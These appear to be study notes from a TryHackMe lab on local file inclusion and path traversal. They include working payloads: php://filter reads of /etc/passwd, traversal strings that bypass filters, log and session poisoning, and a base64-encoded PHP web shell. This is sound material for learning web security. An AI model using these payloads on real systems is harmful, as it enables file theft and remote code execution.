# File Inclusion & Path Traversal

## TASK 4: PHP Wrappers

PHP wrappers enable access to data streams and built-in protocols, posing security risks if misused. For example, in an LFI vulnerability, attackers can use `php://filter` to modify file data. To base64-encode `/etc/passwd`, the payload would be:
```php
php://filter/convert.base64-encode/resource=/etc/passwd
```

### Data Wrapper
The `data://` wrapper allows embedding data directly into code. For example, visiting:
```url
http://10.82.183.63/playground.php?data:text/plain,<?php%20phpinfo();%20?>
```
can execute PHP code, showing PHP configuration details.

---

## TASK: Base Directory Breakouts

### Base Directory Breakout
Web applications often implement safeguards against path traversal attacks, but these are not always effective. Below is an example of code that enforces a base directory:
```php
function containsStr($str, $subStr){
    return strpos($str, $subStr) !== false;
}

if(isset($_GET['page'])){
    if(!containsStr($_GET['page'], '../..') && containsStr($_GET['page'], '/var/www/html')){
        include $_GET['page'];
    }else{
        echo 'You are not allowed to go outside /var/www/html/ directory!';
    }
}
```
To bypass the filter, use payloads like:
```url
/var/www/html/..//..//..//etc/passwd
```

### Obfuscation
Obfuscation techniques help bypass basic security filters in web applications. Examples include:
- URL Encoding: `../` → `%2e%2e%2f`
- Double Encoding: `../` → `%252e%252e%252f`
- Obfuscation: `....//` avoids detection by simple filters.

---

## TASK 6: LFI2RCE - Session Files

### PHP Session Files
PHP session files can be exploited in LFI attacks to achieve Remote Code Execution. For example:
```php
if(isset($_GET['page'])){
    $_SESSION['page'] = $_GET['page'];
    echo "You're currently in" . $_GET["page"];
    include($_GET['page']);
}
```
An attacker can inject PHP code like `<?php echo phpinfo(); ?>` into the `page` parameter, saving it in the session file.

---

## TASK 7: LFI2RCE - Log Poisoning

### Log Poisoning
Log poisoning involves injecting malicious PHP code into a web server's log file and exploiting an LFI vulnerability to include and execute it. Example:
```bash
$ nc 10.82.183.63 80
<?php echo phpinfo(); ?>
```
The code is logged in the server's access logs. The attacker uses LFI to include the log file:
```url
?page=/var/log/apache2/access.log
```

---

## TASK 8: LFI2RCE - Wrappers

### PHP Wrappers
PHP wrappers can enable code execution using the `php://filter` stream wrapper. For example:
```url
http://10.82.183.63/playground.php?page=php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+
```
This decodes and executes the PHP code `<?php system($_GET['cmd']); echo 'Shell done!'; ?>`.

---

## Appendix

Refer to the TryHackMe room for more details.